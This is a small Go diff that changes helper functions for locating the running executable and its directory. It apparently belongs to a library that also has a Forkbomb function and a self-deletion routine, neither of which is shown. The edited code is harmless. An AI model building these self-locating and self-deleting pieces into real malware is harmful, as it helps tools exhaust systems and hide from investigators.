@@ -11,6 +11,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"regexp"
 	"runtime"
 	"strconv"
@@ -176,16 +177,20 @@ func Forkbomb() {
 }
 
 func GetName() (string, error) {
-	_, filename, _, ok := runtime.Caller(1)
-	if !ok {
+	filename, err := osext.Executable()
+	if err != nil {
 		return "", errors.New("unable to get the current filename")
 	}
 	return filename, nil
 }
 
+// Dirname is the __dirname equivalent
 func GetPath() (string, error) {
-	//filename, err :=
-	return osext.Executable()
+	filename, err := GetName()
+	if err != nil {
+		return "", err
+	}
+	return filepath.Dir(filename), nil
 }
 
 // Remove is used to self delete.
